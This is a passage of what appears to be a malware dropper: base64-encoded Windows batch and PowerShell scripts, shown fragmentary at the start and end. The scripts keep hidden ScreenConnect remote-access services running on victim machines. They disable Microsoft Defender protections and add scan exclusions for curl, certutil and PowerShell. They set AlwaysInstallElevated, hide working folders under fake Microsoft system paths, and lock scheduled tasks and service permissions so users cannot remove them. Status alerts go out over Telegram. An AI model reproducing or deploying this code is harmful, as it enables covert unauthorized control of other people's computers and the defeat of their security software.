CiAgZXhpdCAvYiAxCikKbW92ZSAveSAiJU1TSSUudG1wIiAiJU1TSSUiID5udWwgMj4mMQpjYWxs
IDpOb01zaVBvbGljeQpyZW0gTTEzOiBzdGFsZSBwcmltYXJ5IGRpciAoc2VydmljZSBkZWxldGVk
LCBwcm9kdWN0IHVucmVnaXN0ZXJlZCkgYnJlYWtzCnJlbSB0aGUgU0MgaW5zdGFsbGVyIGN1c3Rv
bSBhY3Rpb24gLSBjbGVhciBpdCBiZWZvcmUgaW5zdGFsbGluZwpzYyBxdWVyeSAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQppZiBlcnJvcmxldmVsIDEgaWYgZXhp
c3QgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgKAogIGVjaG8gc3Rh
bGVfcHJpbWFyeV9kaXJfY2xlYW4+PiIlTE9HJSIKICBybWRpciAvcyAvcSAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKKQplY2hvIFslVEFHJV0gbXNp
ZXhlYyBpbnN0YWxsPj4iJUxPRyUiCm1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCAv
TCp2ICIlV0QlXG1zaV9oZWFsLmxvZyIgPm51bCAyPiYxCnNldCAiTVNJRVhJVD0hRVJST1JMRVZF
TCEiCmVjaG8gWyVUQUclXSBtc2lleGVjIGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiCmNhbGwgOldh
aXRTdmMKZXhpdCAvYiAwCgo6UmVwYWlyUmVnaXN0ZXJlZApyZW0gJTE9ZmluZ2VycHJpbnQgLSBz
ZXJ2aWNlIGRlbGV0ZWQgYnV0IHByb2R1Y3QgcmVnaXN0ZXJlZDogcmVwYWlyIGJ5IEdVSUQuCnNj
IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJX4xKSIgPm51bCAyPiYxCmlmIG5vdCBlcnJv
cmxldmVsIDEgZXhpdCAvYiAwCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZXhpdCAv
YiAxCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJX4x
IiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEKY2FsbCA6V2FpdFN2YwpleGl0IC9iIDAK
CjpSZXN0b3JlQWx0CnJlbSBBTFQgc2VydmljZSBnb25lIGJ1dCBzdGlsbCByZWdpc3RlcmVkIChT
Qy1mYW1pbHkgbXNpZXhlYyBzaWRlIGVmZmVjdCkgLSByZXBhaXIgaXQgdG9vLgpzYyBxdWVyeSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxCmlmIG5vdCBlcnJvcmxl
dmVsIDEgZXhpdCAvYiAwCmVjaG8gYWx0IG1pc3NpbmcgLSByZXBhaXIgYXR0ZW1wdD4+IiVMT0cl
IgppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBz
MSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0cl
IiAyPiYxCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQg
IlJVTk5JTkciID5udWwKaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkFMVF9PSz0xIgpleGl0IC9i
IDAKCjpOb01zaVBvbGljeQpyZWcgZGVsZXRlICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jv
c29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvZiA+bnVsIDI+JjEKcmVnIGRl
bGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIi
IC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNp
ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09S
RCAvZCAwIC9mID5udWwgMj4mMQpleGl0IC9iIDAKCjpXYWl0U3ZjCnNldCAiVFJJRVM9MCIKOldh
aXRMb29wCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5k
ICJSVU5OSU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEgKAogIHNldCAiSU5TVEFMTEVEPTEi
CiAgc2V0ICJQUklNX09LPTEiCiAgZXhpdCAvYiAwCikKc2V0IC9hIFRSSUVTKz0xCmlmICVUUklF
UyUgR0VRIDEwIGV4aXQgL2IgMQpwaW5nIDEyNy4wLjAuMSAtbiA3ID5udWwgMj4mMQpnb3RvIDpX
YWl0TG9vcAoKOlRnU3RhdGUKc2V0ICJORVdTVEFURT0lfjEiCnNldCAiTVNHPSV+MiIKc2V0ICJP
TERTVEFURT0iCmlmIGV4aXN0ICIlU1RBVEUlIiBzZXQgL3AgT0xEU1RBVEU9PCIlU1RBVEUlIgpy
ZW0gcmF0ZS1saW1pdCByZXBlYXRlZCBET1dOL0ZBSUw6IG1heCAxIGFsZXJ0IHBlciAzMCBtaW4g
d2hpbGUgc3R1Y2sKaWYgL0kgIiVORVdTVEFURSUiPT0iRE9XTiIgZ290byA6TWF5YmVTdXBwcmVz
cwppZiAvSSAiJU5FV1NUQVRFJSI9PSJGQUlMIiBnb3RvIDpNYXliZVN1cHByZXNzCmdvdG8gOlNl
bmRBbGVydAo6TWF5YmVTdXBwcmVzcwppZiAvSSAiJU5FV1NUQVRFJSI9PSIlT0xEU1RBVEUlIiBp
ZiBleGlzdCAiJVdEJVx0Z19zZW50LmZsYWciICgKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
bkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0g
LUxpdGVyYWxQYXRoICclV0QlXHRnX3NlbnQuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWlu
dXRlcyAtbHQgMzApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwgMj4mMQogIGlmIG5vdCBlcnJv
cmxldmVsIDEgKAogICAgZWNobyB0Z19zdXBwcmVzc2VkXyVORVdTVEFURSU+PiIlTE9HJSIKICAg
IGV4aXQgL2IgMAogICkKKQo6U2VuZEFsZXJ0CmVjaG8gJU5FV1NUQVRFJT4iJVNUQVRFJSIKZWNo
byBzZW50PiIlV0QlXHRnX3NlbnQuZmxhZyIKcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRl
cmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMx
IiAtU3RhdGUgJU5FV1NUQVRFJSAtU3VtbWFyeSAiJU1TRyUiIC1CdWlsZCAlTU9OVkVSJSAtQ291
bnQgJUNPVU5UJSA+bnVsIDI+JjEKZWNobyB0ZyBzdGF0ZSAlTkVXU1RBVEUlIHNlbnQ+PiIlTE9H
JSIKZXhpdCAvYiAwCg==
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM2IC0gaWRlbnRpdHktYXdh
cmUgdGFzayBBQ0wgKyBEaXNhYmxlTVNJIG5ldXRyYWxpemUgKyBleGNsdXNpb25zL0FDTDsgbm8g
YXR0ci1sb2NrIG9uIG11dGFibGUgcGF5bG9hZHMNCnNldGxvY2FsIEVuYWJsZUV4dGVuc2lvbnMg
RW5hYmxlRGVsYXllZEV4cGFuc2lvbg0Kc2V0ICJXRD0lUHJvZ3JhbURhdGElXE1pY3Jvc29mdFxX
aW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJXRDI9JVByb2dyYW1EYXRhJVxNaWNyb3Nv
ZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZSINCnNldCAiTE9HPSVXRCVcYm9vdC5lcnIiDQpz
ZXQgIlBSSU09U2NyZWVuQ29ubmVjdCBDbGllbnQgKDVmNjAxMDU3OTg1MmU1MDcpIg0Kc2V0ICJB
TFQ9U2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpIg0Kc2V0ICJLRUVQMT01
ZjYwMTA1Nzk4NTJlNTA3Ig0Kc2V0ICJLRUVQMj1mODYxYzgxNDBkNDUzNDI3Ig0Kc2V0ICJQRj0l
UHJvZ3JhbUZpbGVzJSINCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIg0Kc2V0ICJUQVNL
Uk9PVD0lU3lzdGVtUm9vdCVcU3lzdGVtMzJcVGFza3MiDQoNCmlmIG5vdCBleGlzdCAiJVdEJSIg
bWtkaXIgIiVXRCUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QyJSIgbWtkaXIgIiVXRDIl
IiA+bnVsIDI+JjENCmVjaG8gc2VjdXJlX2JlZ2luICVEQVRFJSAlVElNRSUgUzY+PiIlTE9HJSIN
Cg0KUkVNIC0tLSBOZXV0cmFsaXplIE1TSSBibG9jayBwb2xpY2llcyAoMTYyNSkgLS0tDQpSRU0g
RGlzYWJsZU1TSTogMD1hbGxvdywgMT1ub24tYWRtaW4gb25seSwgMj1hbGwgLT4gZm9yY2UgMA0K
cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3Yg
QWx3YXlzSW5zdGFsbEVsZXZhdGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVn
IGRlbGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0NVXFNPRlRXQVJFXFBv
bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgQWx3YXlzSW5zdGFsbEVsZXZh
dGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KDQpSRU0gLS0tIERlZmVuZGVyOiBy
ZWdpc3RyeSBleGNsdXNpb25zIChwb2xpY3kgKyBwcmVmZXJlbmNlIGtleXMpIC0tLQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3Yg
RGlzYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdP
UkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwt
VGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlSU9BVlByb3RlY3Rpb24gL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0
U2Nhbm5pbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
V0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdB
UkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRDIl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIkM6XFdpbmRv
d3NcVGVtcCIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
VEVNUCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZU
V0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5u
dWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAy
JSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51
bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQ
MiUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMu
ZXhlIGN1cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNv
bm5lY3QuQ2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkg
ZG8gKA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
IDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2Vy
IHRoYW4gcmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVy
YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlv
blByZWZlcmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVu
Y2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURp
c2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJ
T0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5u
aW5nICR0cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2lu
ZG93c1xUZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUp
JywnJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
UDIlKScpOyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJv
Z3JhbUZpbGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEg
MCB8IEZvckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBm
ODY9W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRw
Zjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5D
b25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVs
bE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1P
YmplY3QgLVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7
IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9y
ZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hl
bGwuZXhlJywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScs
J1NjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4
Y2x1c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJF
TSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAt
LS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0t
LSBoaWRlIHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVX
RCUiID5udWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRv
IE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92
ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZs
ZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4N
CmZvciAlJUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikg
ZG8gKA0KICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVs
ZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNl
cnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50
byBnYXJiYWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkg
aW5zdGVhZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9
J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRl
cmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICcl
V0QlXGlkZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2gg
J15UQVNLX1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0
YXJ0KCdcJykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnTWljcm9zb2Z0XFdpbmRvd3Nc
RGlhZ25vc2lzXFNjaGVkdWxlZCcsJ01pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInLCdNaWNy
b3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdNaWNyb3NvZnRcV2luZG93c1xUY3Bp
cFxJcEFkZHJlc3NDb25mbGljdDEnKSB9OyIgXg0KICAiZm9yZWFjaCgkbiBpbiAkbmFtZXMpeyAk
ZiA9IEpvaW4tUGF0aCAnJVRBU0tST09UJScgJG47IGlmKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
JGYpeyAmIGljYWNscy5leGUgJGYgL2luaGVyaXRhbmNlOnIgfCBPdXQtTnVsbDsgJiBpY2FjbHMu
ZXhlICRmIC9ncmFudDpyICdOVCBBVVRIT1JJVFlcU1lTVEVNOkYnICdCVUlMVElOXEFkbWluaXN0
cmF0b3JzOkYnIHwgT3V0LU51bGw7ICYgYXR0cmliLmV4ZSAraCArcyAkZiB8IE91dC1OdWxsIH0g
fSIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBXTUkgd2F0Y2hkb2cgc3Vic2NyaXB0aW9uIGZp
bGVzIChjaGFpbiAyKSAtLS0NCmljYWNscyAiJVN5c3RlbVJvb3QlXFN5c3RlbTMyXHdiZW1cUmVw
b3NpdG9yeSIgL2dyYW50ICJOVCBBVVRIT1JJVFlcU1lTVEVNOkYiID5udWwgMj4mMQ0KDQpSRU0g
LS0tIEFDTDoga2VlcCBTY3JlZW5Db25uZWN0IGluc3RhbGwgZGlycyAob25jZTsgdGFrZW93biBl
dmVyeSB0aWNrIGlzIG5vaXN5KSAtLS0NCmlmIG5vdCBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxh
ZyIgKA0KICBmb3IgJSVEIGluICgNCiAgICAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVAxJSkiDQogICAgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIg0KICAgICIl
UEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICIlUEY4NiVcU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIg0KICApIGRvICgNCiAgICBpZiBleGlzdCAiJSV+RCIg
Y2FsbCA6TG9ja0RpciAiJSV+RCINCiAgKQ0KICBlY2hvIHNjX2xvY2tlZD4lV0QlXHNlY3VyZV9z
Yy5mbGFnDQopDQoNClJFTSAtLS0gU0Mgc2VydmljZXM6IFNZU1RFTSBjYW4gY29uZmlnL3N0b3Av
ZGVsZXRlOyBCQSBmdWxsOyB1c2VycyBibG9ja2VkIC0tLQ0KUkVNIFNZOiBDQyBEQyBMQyBTVyBS
UCBEVCBMTyBSQyAgKG5vIFNEIC0+IGNhbm5vdCBjaGFuZ2UgdGhpcyBTRCBpdHNlbGYpDQpzZXQg
IlNEPUQ6KEE7O0NDRENMQ1NXUlBXUERUTE9DUlJDOzs7U1kpKEE7O0NDRENMQ1NXUlBXUERUTE9D
UlNEUkNXRFdPOzs7QkEpIg0Kc2MuZXhlIHNkc2V0ICIlUFJJTSUiICIlU0QlIiA+bnVsIDI+JjEN
CnNjLmV4ZSBzZHNldCAiJUFMVCUiICIlU0QlIiA+bnVsIDI+JjENCnNjLmV4ZSBjb25maWcgIiVQ
UklNJSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgY29uZmlnICIlQUxUJSIgc3RhcnQ9
IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0gODY0MDAgYWN0
aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYx
DQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzYw
MDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCg0KZWNobyBzZWN1cmVf
ZG9uZT4+IiVMT0clIg0KZXhpdCAvYiAwDQoNCjpMb2NrRGlyDQpzZXQgIlQ9JX4xIg0KaWYgbm90
IGV4aXN0ICIlVCUiIGV4aXQgL2IgMA0KUkVNIHRha2Ugb3duZXJzaGlwIHRoZW4gc3RyaXAgaW5o
ZXJpdGVkIEFDRXM7IFNZU1RFTStBZG1pbnMgb25seQ0KdGFrZW93biAvRiAiJVQlIiAvUiAvRCBZ
ID5udWwgMj4mMQ0KaWNhY2xzICIlVCUiIC9pbmhlcml0YW5jZTpyID5udWwgMj4mMQ0KaWNhY2xz
ICIlVCUiIC9ncmFudDpyICJOVCBBVVRIT1JJVFlcU1lTVEVNOihPSSkoQ0kpRiIgIkJVSUxUSU5c
QWRtaW5pc3RyYXRvcnM6KE9JKShDSSlGIiA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvcmVtb3Zl
OmcgIlVzZXJzIiAiQXV0aGVudGljYXRlZCBVc2VycyIgIkV2ZXJ5b25lIiAiTlQgQVVUSE9SSVRZ
XElOVEVSQUNUSVZFIiAiQlVJTFRJTlxVc2VycyIgPm51bCAyPiYxDQpleGl0IC9iIDANCg==
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4MDJUOCAtIGlk
ZW50aXR5LWF3YXJlIHRhc2tzICsgY29tcGFjdCBkaWdlc3QgbW9kZTsgLUZvcmNlIG9uIGhpZGRl
biBjYWNoZQ0KcGFyYW0oDQogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmlu
Z10kU3RhdGUsDQogICAgW3N0cmluZ10kU3VtbWFyeSA9ICcnLA0KICAgIFtzdHJpbmddJFdvcmtE
aXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUn
LA0KICAgIFtzdHJpbmddJE9sZFN0YXRlID0gJycsDQogICAgW1ZhbGlkYXRlU2V0KCdyaWNoJywg
J2NvbXBhY3QnKV1bc3RyaW5nXSRNb2RlID0gJ3JpY2gnLA0KICAgIFtzdHJpbmddJEJ1aWxkID0g
J08xNScsDQogICAgW3N0cmluZ10kQ291bnQgPSAnMCcNCikNCg0KJEVycm9yQWN0aW9uUHJlZmVy
